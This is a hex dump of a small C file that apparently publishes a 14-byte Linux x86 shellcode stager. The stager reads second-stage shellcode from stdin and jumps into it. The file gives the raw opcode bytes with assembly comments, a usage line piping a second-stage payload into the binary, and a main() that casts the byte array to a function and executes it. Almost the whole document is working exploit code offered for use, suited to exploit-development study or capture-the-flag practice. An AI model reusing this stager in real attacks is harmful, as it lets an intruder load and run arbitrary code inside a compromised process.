00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 73 74 61 67 67  65 72 20 74 68 61 74 20  |6) stagger that |
00000020  72 65 61 64 73 20 73 65  63 6f 6e 64 20 73 74 61  |reads second sta|
00000030  67 65 20 73 68 65 6c 6c  63 6f 64 65 20 28 31 32  |ge shellcode (12|
00000040  37 20 62 79 74 65 73 20  6d 61 78 69 6d 75 6d 29  |7 bytes maximum)|
00000050  20 66 72 6f 6d 20 73 74  64 69 6e 20 2d 20 31 34  | from stdin - 14|
00000060  20 62 79 74 65 73 0d 0a  20 2a 20 5f 66 6b 7a 20  | bytes.. * _fkz |
00000070  2f 20 74 77 69 74 74 65  72 3a 20 40 5f 66 6b 7a  |/ twitter: @_fkz|
00000080  20 0d 0a 20 2a 0d 0a 20  2a 20 73 63 20 3d 20 22  | .. *.. * sc = "|
00000090  5c 78 36 41 5c 78 37 46  5c 78 35 41 5c 78 35 34  |\x6A\x7F\x5A\x54|
000000a0  5c 78 35 39 5c 78 33 31  5c 78 44 42 5c 78 36 41  |\x59\x31\xDB\x6A|
000000b0  5c 78 30 33 5c 78 35 38  5c 78 43 44 5c 78 38 30  |\x03\x58\xCD\x80|
000000c0  5c 78 35 31 5c 78 43 33  22 0d 0a 20 2a 20 0d 0a  |\x51\xC3".. * ..|
000000d0  20 2a 20 45 78 61 6d 70  6c 65 20 6f 66 20 75 73  | * Example of us|
000000e0  65 3a 0d 0a 20 2a 20 28  65 63 68 6f 20 2d 6e 65  |e:.. * (echo -ne|
000000f0  20 22 5c 78 73 65 63 6f  6e 64 65 20 73 74 61 67  | "\xseconde stag|
00000100  65 20 73 68 65 6c 6c 63  6f 64 65 5c 78 22 3b 20  |e shellcode\x"; |
00000110  63 61 74 29 20 7c 20 2e  2f 73 74 61 67 65 72 0d  |cat) | ./stager.|
00000120  0a 20 2a 2f 0d 0a 20 0d  0a 20 63 68 61 72 20 73  |. */.. .. char s|
00000130  68 65 6c 6c 63 6f 64 65  5b 5d 20 3d 20 0d 0a 20  |hellcode[] = .. |
00000140  0d 0a 20 09 09 22 5c 78  36 41 5c 78 37 46 22 09  |.. .."\x6A\x7F".|
00000150  09 2f 2f 09 70 75 73 68  09 62 79 74 65 09 2b 30  |.//.push.byte.+0|
00000160  78 37 46 0d 0a 20 09 09  22 5c 78 35 41 22 09 09  |x7F.. .."\x5A"..|
00000170  09 2f 2f 09 70 6f 70 09  09 65 64 78 09 0d 0a 20  |.//.pop..edx... |
00000180  09 09 22 5c 78 35 34 22  09 09 09 2f 2f 09 70 75  |.."\x54"...//.pu|
00000190  73 68 09 65 73 70 0d 0a  20 09 09 22 5c 78 35 39  |sh.esp.. .."\x59|
000001a0  22 09 09 09 2f 2f 09 70  6f 70 09 09 65 73 70 0d  |"...//.pop..esp.|
000001b0  0a 20 09 09 22 5c 78 33  31 5c 78 44 42 22 09 09  |. .."\x31\xDB"..|
000001c0  2f 2f 09 78 6f 72 09 09  65 62 78 2c 65 62 78 0d  |//.xor..ebx,ebx.|
000001d0  0a 20 09 09 22 5c 78 36  41 5c 78 30 33 22 09 09  |. .."\x6A\x03"..|
000001e0  2f 2f 09 70 75 73 68 09  62 79 74 65 09 2b 30 78  |//.push.byte.+0x|
000001f0  33 0d 0a 20 09 09 22 5c  78 35 38 22 09 09 09 2f  |3.. .."\x58".../|
00000200  2f 09 70 6f 70 09 09 65  61 78 0d 0a 20 09 09 22  |/.pop..eax.. .."|
00000210  5c 78 43 44 5c 78 38 30  22 09 09 2f 2f 09 69 6e  |\xCD\x80"..//.in|
00000220  74 09 09 30 78 38 30 0d  0a 20 09 09 22 5c 78 35  |t..0x80.. .."\x5|
00000230  31 22 09 09 09 2f 2f 09  70 75 73 68 09 65 63 78  |1"...//.push.ecx|
00000240  0d 0a 20 09 09 22 5c 78  43 33 22 3b 09 09 09 2f  |.. .."\xC3";.../|
00000250  2f 09 72 65 74 0d 0a 0d  0a 69 6e 74 20 6d 61 69  |/.ret....int mai|
00000260  6e 28 69 6e 74 20 61 72  67 63 2c 20 63 68 61 72  |n(int argc, char|
00000270  20 2a 61 72 67 76 5b 5d  29 0d 0a 7b 0d 0a 09 76  | *argv[])..{...v|
00000280  6f 69 64 20 28 2a 65 78  65 63 73 68 29 28 29 20  |oid (*execsh)() |
00000290  3d 20 28 76 6f 69 64 20  2a 29 26 73 68 65 6c 6c  |= (void *)&shell|
000002a0  63 6f 64 65 3b 0d 0a 09  65 78 65 63 73 68 28 29  |code;...execsh()|
000002b0  3b 0d 0a 09 72 65 74 75  72 6e 20 30 3b 0d 0a 7d  |;...return 0;..}|
000002c0
